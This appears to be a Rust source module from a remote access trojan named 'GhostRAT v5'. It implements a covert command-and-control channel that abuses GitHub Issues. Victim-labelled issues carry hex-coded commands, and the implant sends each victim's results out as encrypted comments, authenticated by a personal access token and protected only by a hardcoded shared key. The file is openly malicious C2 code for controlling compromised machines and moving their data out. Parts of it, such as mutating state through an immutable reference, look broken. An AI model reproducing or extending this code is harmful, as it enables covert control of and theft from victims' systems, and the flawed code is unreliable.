//! GitHub Issues C2 channel.
//!
//! Uses GitHub Issues as a command channel:
//! - Commands are sent as comments on issues labeled with the victim's ID
//! - Results are stored in the issue body
//! - Requires a GitHub Personal Access Token with repo scope

use crate::c2::{C2Channel, C2Error, Command};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use tracing::{debug, info, warn};

const GITHUB_API_BASE: &str = "https://api.github.com";

/// GitHub Issues C2 channel
pub struct GitHubIssuesC2 {
    repo_owner: String,
    repo_name: String,
    token: String,
    last_comment_id: HashMap<String, i64>, // victim_id -> last processed comment ID
    available: bool,
}

#[derive(Debug, Deserialize)]
struct GitHubIssuesResponse {
    issue_number: Option<i64>,
}

#[derive(Debug, Deserialize)]
struct GitHubComment {
    id: i64,
    body: Option<String>,
    user: GitHubUser,
}

#[derive(Debug, Deserialize)]
struct GitHubUser {
    login: String,
}

#[derive(Debug, Serialize)]
struct CreateCommentRequest {
    body: String,
}

#[derive(Debug, Serialize)]
struct EditIssueRequest {
    body: String,
}

impl GitHubIssuesC2 {
    pub fn new(repo_owner: String, repo_name: String, token: String) -> Self {
        Self {
            repo_owner,
            repo_name,
            token,
            last_comment_id: HashMap::new(),
            available: true,
        }
    }

    /// Build authenticated request headers
    fn auth_headers(&self) -> HashMap<String, String> {
        let mut headers = HashMap::new();
        headers.insert("Authorization".to_string(), format!("Bearer {}", self.token));
        headers.insert("Accept".to_string(), "application/vnd.github.v3+json".to_string());
        headers
    }

    /// Make a GitHub API request
    async fn github_request(
        &self,
        method: &str,
        url: &str,
        body: Option<&serde_json::Value>,
    ) -> Result<String, C2Error> {
        let client = reqwest::Client::new();
        let mut request = client.request(method.parse().unwrap_or(reqwest::Method::GET), url);
        for (k, v) in &self.auth_headers() {
            request = request.header(k, v);
        }
        if let Some(body) = body {
            request = request.json(body);
        }

        let response = match request.send().await {
            Ok(r) => r,
            Err(e) => {
                warn!("GitHub request failed: {}", e);
                self.available = false;
                return Err(C2Error::Unreachable);
            }
        };

        let status = response.status();
        if status == 403 && response.headers().get("X-RateLimit-Remaining") == Some(&"0".parse().unwrap()) {
            return Err(C2Error::RateLimited);
        }

        if !status.is_success() {
            let text = response.text().await.unwrap_or_default();
            return Err(C2Error::Other(format!("GitHub API error {}: {}", status, text)));
        }

        response.text().await.map_err(C2Error::Http)
    }

    /// Parse a command from a GitHub issue comment body
    fn parse_comment(body: &str, victim_id: &str) -> Option<Command> {
        let lines: Vec<&str> = body.lines().collect();
        if lines.len() < 2 {
            return None;
        }

        // Format: line 1 = victim_id, line 2 = cmd_type_hex, remaining = data
        if lines[0].trim() != victim_id {
            return None;
        }

        let cmd_type = u8::from_str_radix(lines[1].trim().strip_prefix("0x").unwrap_or(lines[1].trim()), 16).ok()?;
        let data = if lines.len() > 2 {
            base64::decode(lines[2..].join("")).unwrap_or_default()
        } else {
            Vec::new()
        };

        Some(Command {
            victim_id: victim_id.to_string(),
            cmd_type,
            data,
            encrypted: false,
            crypto_key: "GHOSTRATV5".to_string(),
        })
    }
}

#[async_trait::async_trait]
impl C2Channel for GitHubIssuesC2 {
    fn name(&self) -> &str {
        "github-issues"
    }

    async fn poll_commands(&self) -> Result<Vec<Command>, C2Error> {
        let mut commands = Vec::new();
        let issues_url = format!("{}/repos/{}/{}/issues?labels=ghostrat-v5&state=open",
            GITHUB_API_BASE, self.repo_owner, self.repo_name);

        let issues_text = self.github_request("GET", &issues_url, None).await?;
        let issues: Vec<serde_json::Value> = serde_json::from_str(&issues_text)
            .map_err(|e| C2Error::Parse(e))?;

        for issue_val in issues {
            let issue_number = issue_val["number"].as_i64().unwrap_or(0);
            let labels: Vec<String> = issue_val["labels"]
                .as_array()
                .map(|arr| arr.iter().filter_map(|l| l["name"].as_str()).map(String::from).collect())
                .unwrap_or_default();

            // Find victim_id from labels
            let victim_id = labels.iter()
                .find(|l| l.starts_with("victim-"))
                .map(|l| l.replace("victim-", ""))
                .unwrap_or_else(|| "all".to_string());

            let last_id = self.last_comment_id.get(&victim_id).copied().unwrap_or(0);

            // Get comments for this issue
            let comments_url = format!("{}/repos/{}/{}/issues/{}/comments",
                GITHUB_API_BASE, self.repo_owner, self.repo_name, issue_number);

            let comments_text = self.github_request("GET", &comments_url, None).await?;
            let comments: Vec<serde_json::Value> = serde_json::from_str(&comments_text)
                .map_err(|e| C2Error::Parse(e))?;

            for comment_val in comments {
                let comment_id = comment_val["id"].as_i64().unwrap_or(0);
                if comment_id <= last_id {
                    continue;
                }

                if let Some(body) = comment_val["body"].as_str() {
                    if let Some(cmd) = Self::parse_comment(body, &victim_id) {
                        commands.push(cmd);
                        self.last_comment_id.insert(victim_id.clone(), comment_id);
                        info!("Parsed GitHub comment command: 0x{:02X} for {}", cmd.cmd_type, cmd.victim_id);
                    }
                }
            }
        }

        Ok(commands)
    }

    async fn send_result(&self, victim_id: &str, result: &[u8]) -> Result<(), C2Error> {
        let encrypted = crate::crypto::encrypt_with_integrity(result, "GHOSTRATV5");
        let encoded = base64::encode(&encrypted);

        // Find or create issue for this victim
        let issues_url = format!("{}/repos/{}/{}/issues?labels=ghostrat-v5&state=open&creator=ghostrat",
            GITHUB_API_BASE, self.repo_owner, self.repo_name);

        let issues_text = self.github_request("GET", &issues_url, None).await?;
        let issues: Vec<serde_json::Value> = serde_json::from_str(&issues_text)
            .map_err(|e| C2Error::Parse(e))?;

        let issue_number = issues.iter()
            .filter_map(|i| i["number"].as_i64())
            .next()
            .ok_or_else(|| C2Error::Other("No victim issue found".to_string()))?;

        // Post result as comment
        let comment_body = format!("{}\n0x{:02X}\n{}", victim_id, 0xFF, encoded);
        let comments_url = format!("{}/repos/{}/{}/issues/{}/comments",
            GITHUB_API_BASE, self.repo_owner, self.repo_name, issue_number);

        let body = serde_json::json!({ "body": comment_body });
        self.github_request("POST", &comments_url, Some(&body)).await?;

        Ok(())
    }

    fn is_available(&self) -> bool {
        self.available
    }
}
